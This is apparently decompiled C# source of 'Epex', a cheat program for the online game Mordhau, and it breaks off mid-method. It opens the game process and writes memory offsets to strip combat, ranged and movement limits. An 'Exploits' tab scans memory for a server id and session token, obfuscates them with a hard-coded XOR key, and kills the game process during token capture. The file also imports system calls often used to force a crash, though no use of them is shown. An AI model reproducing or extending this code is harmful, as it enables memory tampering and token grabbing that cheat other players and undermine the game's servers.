using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Numerics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using ColorSlider;
using epex.mordhau.recode.Controls;
using epex.mordhau.recode.Properties;
using Memory;

namespace epex.mordhau.recode
{
	// Token: 0x02000005 RID: 5
	public partial class Menu : Form
	{
		// Token: 0x06000011 RID: 17
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000012 RID: 18
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000013 RID: 19
		[DllImport("User32.dll")]
		private static extern int GetAsyncKeyState(int i);

		// Token: 0x06000014 RID: 20
		[DllImport("user32.dll")]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000015 RID: 21
		[DllImport("user32.dll")]
		public static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000016 RID: 22
		[DllImport("user32.dll")]
		public static extern IntPtr PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x06000017 RID: 23
		[DllImport("ntdll.dll")]
		private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		// Token: 0x06000018 RID: 24
		[DllImport("ntdll.dll")]
		private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x06000019 RID: 25
		[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
		private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

		// Token: 0x0600001A RID: 26
		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x0600001B RID: 27
		[DllImport("user32.dll", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowTextLength(IntPtr hWnd);

		// Token: 0x0600001C RID: 28 RVA: 0x00003840 File Offset: 0x00001A40
		public Menu()
		{
			base.AutoScaleMode = AutoScaleMode.None;
			this.InitializeComponent();
			this.key.load_keys();
			base.AutoScaleMode = AutoScaleMode.None;
			this.customTabControl1.DisplayStyle = TabStyle.None;
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00003968 File Offset: 0x00001B68
		private void Menu_Load(object sender, EventArgs e)
		{
			base.AutoScaleMode = AutoScaleMode.None;
			this.button1.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			this.CombatButton.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			this.LongButton.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			this.VisualsButton.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			this.MiscButton.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			this.ExploitsButton.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 255, 255);
			int procIdFromName = this.m.GetProcIdFromName("Mordhau-Win64-Shipping");
			if (procIdFromName != 0)
			{
				this.m.OpenProcess(procIdFromName);
				this.gameclose.Start();
				this.PlayerAlive.Start();
				this.combat.Start();
				this.ranged.Start();
				this.visuals.Start();
				this.misc.Start();
				return;
			}
			MessageBox.Show("Cant find game process, please restart the cheat!", "Epex", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			Application.Exit();
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002174 File Offset: 0x00000374
		private void PlayerAlive_Tick(object sender, EventArgs e)
		{
			if (this.m.ReadByte(Offsets.Pawn, "") == 0)
			{
				this.alive = false;
				return;
			}
			this.alive = true;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000219C File Offset: 0x0000039C
		private void button1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000020 RID: 32 RVA: 0x000021A3 File Offset: 0x000003A3
		private void label1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				epex.mordhau.recode.Menu.ReleaseCapture();
				epex.mordhau.recode.Menu.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000021 RID: 33 RVA: 0x000021A3 File Offset: 0x000003A3
		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				epex.mordhau.recode.Menu.ReleaseCapture();
				epex.mordhau.recode.Menu.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x000021CB File Offset: 0x000003CB
		private void CombatButton_Click(object sender, EventArgs e)
		{
			this.LoadForm(0, sender);
		}

		// Token: 0x06000023 RID: 35 RVA: 0x000021D5 File Offset: 0x000003D5
		private void LongButton_Click(object sender, EventArgs e)
		{
			this.LoadForm(1, sender);
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000021DF File Offset: 0x000003DF
		private void VisualsButton_Click(object sender, EventArgs e)
		{
			this.LoadForm(2, sender);
		}

		// Token: 0x06000025 RID: 37 RVA: 0x000021E9 File Offset: 0x000003E9
		private void MiscButton_Click(object sender, EventArgs e)
		{
			this.LoadForm(3, sender);
		}

		// Token: 0x06000026 RID: 38 RVA: 0x000021F3 File Offset: 0x000003F3
		private void ExploitsButton_Click(object sender, EventArgs e)
		{
			this.LoadForm(4, sender);
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00003AD8 File Offset: 0x00001CD8
		public void ButtonStay(Button sender)
		{
			if (this.lastbutton == null)
			{
				sender.BackColor = Color.FromArgb(53, 53, 53);
			}
			else if (this.lastbutton != sender)
			{
				this.lastbutton.BackColor = Color.FromArgb(31, 31, 31);
				sender.BackColor = Color.FromArgb(53, 53, 53);
			}
			this.lastbutton = sender;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003B38 File Offset: 0x00001D38
		public static string xor(string input)
		{
			string text = "djamictechnologies";
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < input.Length; i++)
			{
				stringBuilder.Append(input[i] ^ text[i % text.Length]);
			}
			string text2 = stringBuilder.ToString();
			return Convert.ToBase64String(Encoding.UTF8.GetBytes(text2));
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003B98 File Offset: 0x00001D98
		public static string unxor(string input)
		{
			string text = "djamictechnologies";
			input = Encoding.UTF8.GetString(Convert.FromBase64String(input));
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < input.Length; i++)
			{
				stringBuilder.Append(input[i] ^ text[i % text.Length]);
			}
			return stringBuilder.ToString();
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000021FD File Offset: 0x000003FD
		public void LoadForm(int tab, object sender)
		{
			this.ButtonStay(sender as Button);
			if (this.lasttab != tab)
			{
				this.customTabControl1.SelectTab(tab);
			}
			this.lasttab = tab;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00002227 File Offset: 0x00000427
		private void gameclose_Tick(object sender, EventArgs e)
		{
			if (this.m.GetProcIdFromName("Mordhau-Win64-Shipping") == 0)
			{
				Application.Exit();
			}
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002240 File Offset: 0x00000440
		private void menuswitch_Tick(object sender, EventArgs e)
		{
			if (epex.mordhau.recode.Menu.GetAsyncKeyState(45) == 32769)
			{
				if (this.isvisible)
				{
					base.Hide();
					this.isvisible = false;
					return;
				}
				base.Show();
				this.isvisible = true;
				base.Focus();
			}
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000227A File Offset: 0x0000047A
		private void bindbutton_Click(object sender, EventArgs e)
		{
			this.needbind = this.bindbutton;
			this.whooneedsbind = "animbreaker";
			this.binder.Start();
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00003BF8 File Offset: 0x00001DF8
		private void binder_Tick(object sender, EventArgs e)
		{
			int[] array = new int[] { 0, 1, 2, 27, 45, 91, 92 };
			int i;
			int j;
			for (i = 0; i < 32768; i = j + 1)
			{
				if (epex.mordhau.recode.Menu.GetAsyncKeyState(i) == 32769 && !array.Any((int x) => x == i))
				{
					string text = this.whooneedsbind;
					if (!(text == "animbreaker"))
					{
						if (text == "lag")
						{
							this.lagbind = i;
						}
					}
					else
					{
						this.animbreakerbind = i;
					}
					this.needbind.Text = this.key.d[i];
					this.binder.Stop();
				}
				j = i;
			}
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003CD8 File Offset: 0x00001ED8
		private void turncapbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (this.turncapbutton.Checked)
			{
				this.turncapSlider.Enabled = true;
				this.label10.ForeColor = Color.White;
				this.label11.ForeColor = Color.White;
				this.turncapSlider.BarInnerColor = Color.FromArgb(38, 38, 38);
				this.turncapSlider.BarPenColorBottom = Color.FromArgb(38, 38, 38);
				this.turncapSlider.BarPenColorTop = Color.FromArgb(38, 38, 38);
				this.turncapSlider.ElapsedInnerColor = Color.FromArgb(118, 118, 118);
				this.turncapSlider.ElapsedPenColorBottom = Color.FromArgb(118, 118, 118);
				this.turncapSlider.ElapsedPenColorTop = Color.FromArgb(118, 118, 118);
				this.turncapSlider.ThumbInnerColor = Color.FromArgb(118, 118, 118);
				this.turncapSlider.ThumbOuterColor = Color.FromArgb(118, 118, 118);
				this.turncapSlider.ThumbPenColor = Color.FromArgb(118, 118, 118);
				return;
			}
			this.label10.ForeColor = Color.FromArgb(150, 150, 150);
			this.label11.ForeColor = Color.FromArgb(150, 150, 150);
			this.turncapSlider.Enabled = false;
			this.turncapSlider.BarInnerColor = Color.FromArgb(18, 18, 18);
			this.turncapSlider.BarPenColorBottom = Color.FromArgb(18, 18, 18);
			this.turncapSlider.BarPenColorTop = Color.FromArgb(18, 18, 18);
			this.turncapSlider.ElapsedInnerColor = Color.FromArgb(78, 78, 78);
			this.turncapSlider.ElapsedPenColorBottom = Color.FromArgb(78, 78, 78);
			this.turncapSlider.ElapsedPenColorTop = Color.FromArgb(78, 78, 78);
			this.turncapSlider.ThumbInnerColor = Color.FromArgb(78, 78, 78);
			this.turncapSlider.ThumbOuterColor = Color.FromArgb(78, 78, 78);
			this.turncapSlider.ThumbPenColor = Color.FromArgb(78, 78, 78);
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003EF8 File Offset: 0x000020F8
		private void turncapSlider_ValueChanged(object sender, EventArgs e)
		{
			if (this.turncapSlider.Value == 1000m)
			{
				this.label11.Text = "Free";
				return;
			}
			this.label11.Text = this.turncapSlider.Value.ToString();
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00003F50 File Offset: 0x00002150
		private void combat_Tick(object sender, EventArgs e)
		{
			if (this.alive)
			{
				try
				{
					if (this.delaybutton.Checked)
					{
						this.m.WriteMemory(Offsets.ParryR, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.ParryL, "int", "1", "", null, true);
					}
					if (this.combobutton.Checked)
					{
						this.m.WriteMemory(Offsets.StabCombo, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StabCombo1, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StabCombo2, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StabCombo3, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StrikeCombo, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StrikeCombo1, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StrikeCombo2, "int", "1", "", null, true);
						this.m.WriteMemory(Offsets.StrikeCombo3, "int", "1", "", null, true);
					}
					if (this.turncapbutton.Checked)
					{
						if (this.turncapSlider.Value != 1000m)
						{
							float num = this.m.ReadFloat(Offsets.TurnCap1, "", true);
							float num2 = this.m.ReadFloat(Offsets.TurnCap3, "", true);
							if (((int)num > 0 && (int)num < this.turncapSlider.Value) || ((int)num2 > 0 && (int)num2 < Math.Round(this.turncapSlider.Value / 100m * 70m)))
							{
								this.m.WriteMemory(Offsets.TurnCap1, "float", string.Format("{0}", this.turncapSlider.Value), "", null, true);
								this.m.WriteMemory(Offsets.TurnCap2, "float", string.Format("{0}", this.turncapSlider.Value), "", null, true);
								this.m.WriteMemory(Offsets.TurnCap3, "float", string.Format("{0}", Math.Round(this.turncapSlider.Value / 100m * 70m)), "", null, true);
								this.m.WriteMemory(Offsets.TurnCap4, "float", string.Format("{0}", Math.Round(this.turncapSlider.Value / 100m * 70m)), "", null, true);
							}
						}
						else
						{
							this.m.WriteMemory(Offsets.TurnCap1, "float", "-1", "", null, true);
							this.m.WriteMemory(Offsets.TurnCap2, "float", "-1", "", null, true);
							this.m.WriteMemory(Offsets.TurnCap3, "float", "-1", "", null, true);
							this.m.WriteMemory(Offsets.TurnCap4, "float", "-1", "", null, true);
						}
					}
					if (this.animbreaker.Checked && epex.mordhau.recode.Menu.GetAsyncKeyState(this.animbreakerbind) > 0)
					{
						this.m.WriteMemory(Offsets.endtime, "float", "-1", "", null, true);
						this.m.ReadInt(Offsets.endtime, "");
					}
					if (this.ripostefeint.Checked && this.m.ReadInt(Offsets.motion + ",38", "") != 0)
					{
						this.m.WriteMemory(Offsets.motion + ",B6C", "byte", "1", "", null, true);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00004408 File Offset: 0x00002608
		private void delaybutton_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.delaybutton.Checked)
			{
				this.m.WriteMemory(Offsets.ParryR, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.ParryL, "int", "0", "", null, true);
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00004468 File Offset: 0x00002668
		private void combobutton_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.combobutton.Checked)
			{
				this.m.WriteMemory(Offsets.StabCombo, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StabCombo1, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StabCombo2, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StabCombo3, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StrikeCombo, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StrikeCombo1, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StrikeCombo2, "int", "0", "", null, true);
				this.m.WriteMemory(Offsets.StrikeCombo3, "int", "0", "", null, true);
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00004598 File Offset: 0x00002798
		private void ranged_Tick(object sender, EventArgs e)
		{
			if (this.alive)
			{
				try
				{
					if (this.fastbutton.Checked)
					{
						this.m.WriteMemory(Offsets.Rdrawtime, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.Rcanceltime, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.Rreleasetime, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.Ldrawtime, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.Lcanceltime, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.Lreleasetime, "float", "-1", "", null, true);
					}
					if (this.holdbutton.Checked)
					{
						this.m.WriteMemory(Offsets.Lmaxhold, "float", "999999999", "", null, true);
					}
					if (this.accurbutton.Checked)
					{
						this.m.WriteMemory(Offsets.Ltrembl, "float", "999999999", "", null, true);
						this.m.WriteMemory(Offsets.Lsway, "long", "0", "", null, true);
					}
					if (this.reloadanimbutton.Checked)
					{
						this.m.WriteMemory(Offsets.Rreloadanim, "long", "0", "", null, true);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x0000475C File Offset: 0x0000295C
		private void visuals_Tick(object sender, EventArgs e)
		{
			if (this.alive)
			{
				try
				{
					if (this.fovbutton.Checked)
					{
						this.m.WriteMemory(Offsets.CustomFov, "float", string.Format("{0}", this.fovslider.Value), "", null, true);
					}
					if (this.tpbutton.Checked)
					{
						this.m.WriteMemory(Offsets.ThirdpersonX, "float", string.Format("-{0}", this.tpslider.Value), "", null, true);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x00004814 File Offset: 0x00002A14
		private void fovbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (this.fovbutton.Checked)
			{
				this.fovslider.Enabled = true;
				this.label17.ForeColor = Color.White;
				this.fovlabel.ForeColor = Color.White;
				this.fovslider.BarInnerColor = Color.FromArgb(38, 38, 38);
				this.fovslider.BarPenColorBottom = Color.FromArgb(38, 38, 38);
				this.fovslider.BarPenColorTop = Color.FromArgb(38, 38, 38);
				this.fovslider.ElapsedInnerColor = Color.FromArgb(118, 118, 118);
				this.fovslider.ElapsedPenColorBottom = Color.FromArgb(118, 118, 118);
				this.fovslider.ElapsedPenColorTop = Color.FromArgb(118, 118, 118);
				this.fovslider.ThumbInnerColor = Color.FromArgb(118, 118, 118);
				this.fovslider.ThumbOuterColor = Color.FromArgb(118, 118, 118);
				this.fovslider.ThumbPenColor = Color.FromArgb(118, 118, 118);
				return;
			}
			this.fovslider.Enabled = false;
			this.label17.ForeColor = Color.FromArgb(150, 150, 150);
			this.fovlabel.ForeColor = Color.FromArgb(150, 150, 150);
			this.fovslider.BarInnerColor = Color.FromArgb(18, 18, 18);
			this.fovslider.BarPenColorBottom = Color.FromArgb(18, 18, 18);
			this.fovslider.BarPenColorTop = Color.FromArgb(18, 18, 18);
			this.fovslider.ElapsedInnerColor = Color.FromArgb(78, 78, 78);
			this.fovslider.ElapsedPenColorBottom = Color.FromArgb(78, 78, 78);
			this.fovslider.ElapsedPenColorTop = Color.FromArgb(78, 78, 78);
			this.fovslider.ThumbInnerColor = Color.FromArgb(78, 78, 78);
			this.fovslider.ThumbOuterColor = Color.FromArgb(78, 78, 78);
			this.fovslider.ThumbPenColor = Color.FromArgb(78, 78, 78);
			this.m.WriteMemory(Offsets.CustomFov, "float", "0", "", null, true);
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00004A58 File Offset: 0x00002C58
		private void fovslider_ValueChanged(object sender, EventArgs e)
		{
			this.fovlabel.Text = this.fovslider.Value.ToString();
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00004A84 File Offset: 0x00002C84
		private void tpbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (this.tpbutton.Checked)
			{
				this.tpslider.Enabled = true;
				this.label19.ForeColor = Color.White;
				this.tpvalue.ForeColor = Color.White;
				this.tpslider.BarInnerColor = Color.FromArgb(38, 38, 38);
				this.tpslider.BarPenColorBottom = Color.FromArgb(38, 38, 38);
				this.tpslider.BarPenColorTop = Color.FromArgb(38, 38, 38);
				this.tpslider.ElapsedInnerColor = Color.FromArgb(118, 118, 118);
				this.tpslider.ElapsedPenColorBottom = Color.FromArgb(118, 118, 118);
				this.tpslider.ElapsedPenColorTop = Color.FromArgb(118, 118, 118);
				this.tpslider.ThumbInnerColor = Color.FromArgb(118, 118, 118);
				this.tpslider.ThumbOuterColor = Color.FromArgb(118, 118, 118);
				this.tpslider.ThumbPenColor = Color.FromArgb(118, 118, 118);
				return;
			}
			this.tpslider.Enabled = false;
			this.label19.ForeColor = Color.FromArgb(150, 150, 150);
			this.tpvalue.ForeColor = Color.FromArgb(150, 150, 150);
			this.tpslider.BarInnerColor = Color.FromArgb(18, 18, 18);
			this.tpslider.BarPenColorBottom = Color.FromArgb(18, 18, 18);
			this.tpslider.BarPenColorTop = Color.FromArgb(18, 18, 18);
			this.tpslider.ElapsedInnerColor = Color.FromArgb(78, 78, 78);
			this.tpslider.ElapsedPenColorBottom = Color.FromArgb(78, 78, 78);
			this.tpslider.ElapsedPenColorTop = Color.FromArgb(78, 78, 78);
			this.tpslider.ThumbInnerColor = Color.FromArgb(78, 78, 78);
			this.tpslider.ThumbOuterColor = Color.FromArgb(78, 78, 78);
			this.tpslider.ThumbPenColor = Color.FromArgb(78, 78, 78);
			this.m.WriteMemory(Offsets.ThirdpersonX, "float", "-100", "", null, true);
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00004CC8 File Offset: 0x00002EC8
		private void tpslider_ValueChanged(object sender, EventArgs e)
		{
			this.tpvalue.Text = this.tpslider.Value.ToString();
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00004CF4 File Offset: 0x00002EF4
		private void misc_Tick(object sender, EventArgs e)
		{
			if (this.alive)
			{
				try
				{
					if (this.afkbutton.Checked)
					{
						this.m.WriteMemory(Offsets.AntiAFK, "float", "9999999", "", null, true);
					}
					if (this.restrictbutton.Checked)
					{
						this.m.WriteMemory(Offsets.MovRes, "int", "0", "", null, true);
					}
					if (this.sprintbutton.Checked)
					{
						this.m.WriteMemory(Offsets.SuperSprint, "int", "1", "", null, true);
					}
					if (this.moonwalkbutton.Checked)
					{
						this.m.WriteMemory(Offsets.bCanDodge, "byte", "1", "", null, true);
						this.m.WriteMemory(Offsets.DodgeDuration, "float", (this.dodgeslider.Value / 100m).ToString().Replace(",", ".") ?? "", "", null, true);
						this.m.WriteMemory(Offsets.DodgeCooldown, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.DodgeCost, "int", "0", "", null, true);
						this.m.WriteMemory(Offsets.DodgeCanceled, "int", "0", "", null, true);
					}
					if (this.ballistabutton.Checked)
					{
						this.m.WriteMemory(Offsets.TurnCap1, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.TurnCap3, "float", "-1", "", null, true);
						this.m.WriteMemory(Offsets.addforward, "byte", "1", "", null, true);
						this.m.WriteMemory(Offsets.addright, "byte", "1", "", null, true);
						this.m.WriteMemory(Offsets.turnlimit, "float", "-1", "", null, true);
					}
					if (this.warmupbutton.Checked)
					{
						this.m.WriteMemory(Offsets.movewarmup, "int", "0", "", null, true);
					}
					if (this.voicespam.Checked)
					{
						this.m.WriteMemory(Offsets.lastvoice, "int", "0", "", null, true);
						this.m.WriteMemory(Offsets.voicequeue, "float", "999999", "", null, true);
					}
					return;
				}
				catch
				{
					return;
				}
			}
			try
			{
				if (this.afkbutton.Checked)
				{
					this.m.WriteMemory(Offsets.AntiAFK, "float", "9999999", "", null, true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x0000229E File Offset: 0x0000049E
		private void voicespam_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.voicespam.Checked)
			{
				this.m.WriteMemory(Offsets.voicequeue, "float", "0.3", "", null, true);
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000022CF File Offset: 0x000004CF
		private void warmupbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.warmupbutton.Checked)
			{
				this.m.WriteMemory(Offsets.movewarmup, "int", "1", "", null, true);
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x00002300 File Offset: 0x00000500
		private void afkbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.afkbutton.Checked)
			{
				this.m.WriteMemory(Offsets.AntiAFK, "float", "180", "", null, true);
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00002331 File Offset: 0x00000531
		private void sprintbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (!this.sprintbutton.Checked)
			{
				this.m.WriteMemory(Offsets.SuperSprint, "int", "0", "", null, true);
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00005030 File Offset: 0x00003230
		private void dodgeslider_ValueChanged(object sender, EventArgs e)
		{
			this.dodgevalue.Text = this.dodgeslider.Value.ToString();
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000505C File Offset: 0x0000325C
		private void moonwalkbutton_CheckedChanged(object sender, EventArgs e)
		{
			if (this.moonwalkbutton.Checked)
			{
				this.dodgeslider.Enabled = true;
				this.label24.ForeColor = Color.White;
				this.dodgevalue.ForeColor = Color.White;
				this.dodgeslider.BarInnerColor = Color.FromArgb(38, 38, 38);
				this.dodgeslider.BarPenColorBottom = Color.FromArgb(38, 38, 38);
				this.dodgeslider.BarPenColorTop = Color.FromArgb(38, 38, 38);
				this.dodgeslider.ElapsedInnerColor = Color.FromArgb(118, 118, 118);
				this.dodgeslider.ElapsedPenColorBottom = Color.FromArgb(118, 118, 118);
				this.dodgeslider.ElapsedPenColorTop = Color.FromArgb(118, 118, 118);
				this.dodgeslider.ThumbInnerColor = Color.FromArgb(118, 118, 118);
				this.dodgeslider.ThumbOuterColor = Color.FromArgb(118, 118, 118);
				this.dodgeslider.ThumbPenColor = Color.FromArgb(118, 118, 118);
				return;
			}
			this.dodgeslider.Enabled = false;
			this.label24.ForeColor = Color.FromArgb(150, 150, 150);
			this.dodgevalue.ForeColor = Color.FromArgb(150, 150, 150);
			this.dodgeslider.BarInnerColor = Color.FromArgb(18, 18, 18);
			this.dodgeslider.BarPenColorBottom = Color.FromArgb(18, 18, 18);
			this.dodgeslider.BarPenColorTop = Color.FromArgb(18, 18, 18);
			this.dodgeslider.ElapsedInnerColor = Color.FromArgb(78, 78, 78);
			this.dodgeslider.ElapsedPenColorBottom = Color.FromArgb(78, 78, 78);
			this.dodgeslider.ElapsedPenColorTop = Color.FromArgb(78, 78, 78);
			this.dodgeslider.ThumbInnerColor = Color.FromArgb(78, 78, 78);
			this.dodgeslider.ThumbOuterColor = Color.FromArgb(78, 78, 78);
			this.dodgeslider.ThumbPenColor = Color.FromArgb(78, 78, 78);
			this.m.WriteMemory(Offsets.DodgeDuration, "float", "0.35", "", null, true);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000052A0 File Offset: 0x000034A0
		public void exploitstatus(string msg)
		{
			epex.mordhau.recode.Menu.SafeInvoke(this.exploitstatuslabel, delegate
			{
				this.exploitstatuslabel.Text = "Status: " + msg;
			});
			epex.mordhau.recode.Menu.SafeInvoke(this.exploitstatuslabel, delegate
			{
				this.exploitstatuslabel.Visible = true;
			});
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000052F0 File Offset: 0x000034F0
		public void disable(int x)
		{
			if (x == 0)
			{
				this.findtoken.Enabled = false;
				this.findid.Enabled = false;
				this.loadtoken.Enabled = false;
				this.CombatButton.Enabled = false;
				this.LongButton.Enabled = false;
				this.VisualsButton.Enabled = false;
				this.MiscButton.Enabled = false;
				this.ExploitsButton.Enabled = false;
				this.gameclose.Stop();
				this.PlayerAlive.Stop();
				this.combat.Stop();
				this.ranged.Stop();
				this.visuals.Stop();
				this.misc.Stop();
				return;
			}
			epex.mordhau.recode.Menu.SafeInvoke(this.findtoken, delegate
			{
				this.findtoken.Enabled = true;
			});
			epex.mordhau.recode.Menu.SafeInvoke(this.findid, delegate
			{
				this.findid.Enabled = true;
			});
			epex.mordhau.recode.Menu.SafeInvoke(this.loadtoken, delegate
			{
				this.loadtoken.Enabled = true;
			});
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002362 File Offset: 0x00000562
		private void findtoken_Click(object sender, EventArgs e)
		{
			this.disable(0);
			base.TopMost = false;
			this.tokenfinder.RunWorkerAsync();
		}

		// Token: 0x06000044 RID: 68 RVA: 0x0000237D File Offset: 0x0000057D
		private void findid_Click(object sender, EventArgs e)
		{
			this.disable(0);
			this.idfinder.RunWorkerAsync();
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000053EC File Offset: 0x000035EC
		public static void SafeInvoke(Control control, Action action)
		{
			if (control.InvokeRequired)
			{
				control.Invoke(new MethodInvoker(delegate()
				{
					action();
				}));
				return;
			}
			action();
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00005430 File Offset: 0x00003630
		public static uint hash(string str)
		{
			uint num = 0U;
			uint num2 = 0U;
			while ((ulong)num2 < (ulong)((long)str.Length))
			{
				num = (num << 4) + (uint)((byte)str[(int)num2]);
				uint num3;
				if ((num3 = num & 4026531840U) != 0U)
				{
					num ^= num3 >> 24;
				}
				num &= ~num3;
				num2 += 1U;
			}
			return num;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x0000547C File Offset: 0x0000367C
		private void idfinder_DoWork(object sender, DoWorkEventArgs e)
		{
			this.serverid = "";
			try
			{
				this.exploitstatus("Trying to get server id...");
				if (this.serverid.Length < 1)
				{
					Task<IEnumerable<long>> task = this.m.AoBScan("53 65 72 76 65 72 49 64 3A", true, false, "");
					task.Wait();
					using (IEnumerator<long> enumerator = task.Result.GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							long num = enumerator.Current;
							string text = this.m.ReadString(num.ToString("X"), "", 1000, true, Encoding.UTF8);
							text = text.Replace(" ", "");
							text = text.Substring(text.IndexOf(':'), text.IndexOf(','));
							text = text.Substring(text.IndexOf(':'), text.IndexOf(','));
							text = text.Replace(":", "");
							this.serverid = epex.mordhau.recode.Menu.xor(text);
							this.exploitstatus("Server id found!");
							epex.mordhau.recode.Menu.SafeInvoke(this.serveridlabel, delegate
							{
								this.serveridlabel.Text = string.Format("Server id: {0}", epex.mordhau.recode.Menu.hash(this.serverid));
							});
							if (this.tokenid.Length > 1)
							{
								epex.mordhau.recode.Menu.SafeInvoke(this.savetoken, delegate
								{
									this.savetoken.Enabled = true;
								});
							}
						}
					}
				}
				if (this.serverid.Length < 1)
				{
					this.exploitstatus("Couldn't get server id");
				}
			}
			catch
			{
			}
			this.disable(1);
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00005624 File Offset: 0x00003824
		private void tokenfinder_DoWork(object sender, DoWorkEventArgs e)
		{
			this.tokenid = "";
			this.exploitstatus("Closing mordhau");
			MessageBox.Show("Your game will be restarted, if not please start game manually.", "Epex Exploits", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Mordhau-Win64-Shipping");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
			}
